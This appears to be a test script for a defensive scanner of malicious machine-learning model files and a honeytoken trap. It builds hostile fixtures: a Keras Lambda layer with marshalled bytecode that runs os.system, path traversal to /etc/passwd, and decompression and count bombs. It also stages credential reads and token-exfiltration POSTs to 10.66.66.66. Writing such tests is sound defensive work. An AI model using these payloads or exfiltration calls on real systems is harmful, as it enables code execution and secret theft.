"""Vigilant master test pipeline: builds fixtures, runs every subsystem."""
import base64, json, marshal, os, struct, sys, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import model_dispatcher
from interceptors.honeypot_engine import HoneypotEngine, HoneytokenExfiltrationAlert
from interceptors.canary_registry import CanaryRegistry

tmp = tempfile.mkdtemp(prefix="vigilant_")
results = []

# ---------- fixture builders ----------
def w(name, data):
    p = os.path.join(tmp, name); open(p, "wb").write(data); return p

def clean_safetensors():
    header = json.dumps({"w": {"dtype": "F32", "shape": [2, 2], "data_offsets": [0, 16]},
                         "__metadata__": {"format": "pt"}}).encode()
    pad = 8 + len(header)
    return w("clean.safetensors", struct.pack("<Q", len(header)) + header + b"\x00" * 16)

def polyglot_safetensors():
    header = json.dumps({"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
                         "__metadata__": {"note": "../../etc/passwd"}}).encode()
    return w("evil.safetensors", struct.pack("<Q", len(header)) + header + b"\x7fELF" + b"\x00" * 4)

def bomb_safetensors():
    header = json.dumps({"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 99999]}}).encode()
    return w("oob.safetensors", struct.pack("<Q", len(header)) + header + b"\x00" * 4)

def gguf_ok():
    def s(x): return struct.pack("<Q", len(x)) + x
    kv = s(b"general.architecture") + struct.pack("<I", 8) + s(b"llama")
    return w("ok.gguf", b"GGUF" + struct.pack("<IQQ", 2, 0, 1) + kv)

def gguf_evil():
    return w("evil.gguf", b"GGUF" + struct.pack("<IQQ", 2, 0, 5_000_000) + b"\x00" * 32)

def hdf5_fixtures():
    import h5py, numpy as np
    clean = os.path.join(tmp, "clean.h5")
    with h5py.File(clean, "w") as f:
        f.create_dataset("dense/kernel", data=np.zeros((8, 8), dtype="f4"))
    # malicious: Lambda layer w/ os.system bytecode + compression bomb
    def evil(): os.system("id")
    blob = base64.b64encode(marshal.dumps(evil.__code__)).decode()
    cfg = {"config": {"layers": [{"class_name": "Lambda", "config": {"name": "backdoor", "function": blob}}]}}
    evil_h5 = os.path.join(tmp, "evil.h5")
    with h5py.File(evil_h5, "w") as f:
        f.attrs["model_config"] = json.dumps(cfg)
        f.create_dataset("bomb", data=np.ones((4096, 4096), dtype="f4"), compression="gzip", compression_opts=9)
    return clean, evil_h5

def onnx_fixtures():
    import onnx
    from onnx import helper, TensorProto
    node = helper.make_node("Relu", ["x"], ["y"])
    graph = helper.make_graph([node], "g",
        [helper.make_tensor_value_info("x", TensorProto.FLOAT, [1, 4])],
        [helper.make_tensor_value_info("y", TensorProto.FLOAT, [1, 4])])
    m = helper.make_model(graph)
    clean = os.path.join(tmp, "clean.onnx"); onnx.save(m, clean)
    # evil: external data traversal
    t = helper.make_tensor("w", TensorProto.FLOAT, [1], [1.0])
    t.data_location = onnx.TensorProto.EXTERNAL
    kv = t.external_data.add(); kv.key, kv.value = "location", "../../etc/passwd"
    t.ClearField("float_data")
    g2 = helper.make_graph([node], "g2",
        [helper.make_tensor_value_info("x", TensorProto.FLOAT, [1, 4])],
        [helper.make_tensor_value_info("y", TensorProto.FLOAT, [1, 4])],
        initializer=[t])
    evil = os.path.join(tmp, "evil.onnx"); onnx.save(helper.make_model(g2), evil)
    return clean, evil

st_clean, st_poly, st_bomb = clean_safetensors(), polyglot_safetensors(), bomb_safetensors()
gg_ok, gg_bad = gguf_ok(), gguf_evil()
h5_clean, h5_evil = hdf5_fixtures()
onnx_clean, onnx_evil = onnx_fixtures()

# ---------- static scanner tests ----------
cases = [
    ("st clean",   st_clean,   "SAFETENSORS", "BENIGN"),
    ("st polyglot",st_poly,    "SAFETENSORS", "MALICIOUS"),
    ("st oob",     st_bomb,    "SAFETENSORS", "MALICIOUS"),
    ("gguf ok",    gg_ok,      "GGUF",        "BENIGN"),
    ("gguf bomb",  gg_bad,     "GGUF",        "MALICIOUS"),
    ("h5 clean",   h5_clean,   "HDF5",        "BENIGN"),
    ("h5 evil",    h5_evil,    "HDF5",        "MALICIOUS"),
    ("onnx clean", onnx_clean, "ONNX",        "BENIGN"),
    ("onnx evil",  onnx_evil,  "ONNX",        "MALICIOUS"),
]
for label, path, fmt, verdict in cases:
    r = model_dispatcher.dispatch(path, arm_honeypot=False)
    ok = r["format"] == fmt and r["verdict"] == verdict
    results.append((label, ok, r["verdict"], r["attack_vector"], r["summary"][:90]))

# ---------- honeypot tests ----------
CanaryRegistry.reset()
engine = HoneypotEngine(verbose=False)
engine.start()
# 1. fake sensitive file
fake = open(os.path.expanduser("~/.aws/credentials")).read()
t1 = "VIGILANT_HONEY" in fake and "aws_secret_access_key" in fake
# 2. env honeytoken
env_tok = os.getenv("OPENAI_API_KEY")
t2 = env_tok is not None and env_tok.startswith("sk-vigilant-")
# 3. exfiltration trap via http.client (payload carries the canary)
import http.client
conn = http.client.HTTPConnection("10.66.66.66", 9999)
try:
    conn.request("POST", "/steal", body=f"key={env_tok}")
    t3 = False
except HoneytokenExfiltrationAlert:
    t3 = True
except OSError:
    t3 = False
# 4. socket.sendall trap
import socket
s = socket.socket()
try:
    s.connect(("10.66.66.66", 9999))
except OSError:
    pass
try:
    s.sendall(f"token={env_tok}".encode())
    t4 = False
except HoneytokenExfiltrationAlert:
    t4 = True
except OSError:
    t4 = False
s.close()
# 5. urllib trap
import urllib.request
try:
    urllib.request.urlopen("http://10.66.66.66:9999/x", data=f"t={env_tok}".encode(), timeout=1)
    t5 = False
except HoneytokenExfiltrationAlert:
    t5 = True
except Exception:
    t5 = False
engine.stop()
# 6. restoration sanity
t6 = open("/dev/null") is not None and os.getenv("DEFINITELY_NOT_SET_XYZ") is None
for label, ok in [("hp fake-file", t1), ("hp env", t2), ("hp http exfil", t3),
                  ("hp socket exfil", t4), ("hp urllib exfil", t5), ("hp restore", t6)]:
    results.append((label, ok, "-", "HONEYTOKEN_EXFIL" if ok else "-", ""))

# ---------- dispatcher pickle routing ----------
pickle_file = w("model.pkl", b"\x80\x04\x95")
r = model_dispatcher.dispatch(pickle_file, sandbox_runner=lambda p: {
    "verdict": "BENIGN", "confidence": "HIGH", "attack_vector": "NONE",
    "summary": "sandbox ran clean", "technical_details": {}})
ok = r["format"] == "PICKLE" and "honeypot" in r["technical_details"]
results.append(("dispatcher pickle+honeypot", ok, r["verdict"], r["attack_vector"], ""))

# ---------- report ----------
print("=" * 96)
fails = 0
for label, ok, verdict, vector, summary in results:
    mark = "PASS" if ok else "FAIL"
    if not ok: fails += 1
    print(f"[{mark}] {label:<28} verdict={verdict:<10} vector={vector:<18} {summary}")
print("=" * 96)
print(f"{len(results)-fails}/{len(results)} passed")
sys.exit(1 if fails else 0)
